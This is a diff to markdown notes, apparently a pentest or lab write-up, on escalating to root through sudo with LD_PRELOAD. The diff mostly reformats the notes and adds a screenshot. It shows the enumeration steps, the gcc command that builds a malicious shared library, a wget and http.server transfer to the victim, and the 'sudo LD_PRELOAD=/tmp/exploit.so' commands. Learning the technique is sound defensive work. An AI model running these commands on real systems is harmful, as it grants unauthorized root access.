@@ -32,9 +32,11 @@ LD_PRELOAD: Is an optional Environment Variable that is used to set/load Shared 
 **STEPS to exploit this**
 
 1. Execute sudo -l to see if we have limited SUDO access to any programs or scripts. For example, if we have a file ```/otp/cleanup.sh``` running with root access without password, we will exploit this as follow.
-2. Enumerate to see if we have permission to set the environment variable for the script or program. In this case we see that we can ```SETENV``` which means the same. Also see if the ```env_keep += LD_PRELOAD``` is set here or in the sudoers file. In this case we don’t see that but the ```SETENV``` is enough.
+2. Enumerate to see if we have permission to set the environment variable for the script or program. In this case we see that we can ```SETENV``` which means the same. Also see if the ```env_keep += LD_PRELOAD``` is set here or in the sudoers file. 
  
 ![Screenshot from 2024-09-29 00-42-22](https://github.com/user-attachments/assets/b83d3699-fe1a-4f6c-abb0-44090406af44)
+![Screenshot from 2024-09-29 00-54-16](https://github.com/user-attachments/assets/219ce0c7-6e11-4dcd-bf18-b0f4fb1f42ab)
+
 
 3. Write and compile a malicious binary that will give us a root shell. We can write and compile it in the victim machine if gcc and ```vim/nano``` is present there. Or we can write and compile the code in our Attack Machine and then use ```python3 -m http.server 80``` to host the file and wget it in the Victim Machine.
 4. creat our script ```exploit.c```:
@@ -57,8 +59,12 @@ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
 6. Now it’s time to load our malicious shared library into the memory:
 ```
 sudo LD_PRELOAD=<location_to_our_shared_library> <location_to_the_script/program>
-#ex
+```
+ex
+```
 sudo LD_PRELOAD=/tmp/exploit.so /opt/cleanup.sh
+#OR
+sudo LD_PRELOAD=/tmp/exploit.so find
 ```
 now, we have root access.
 
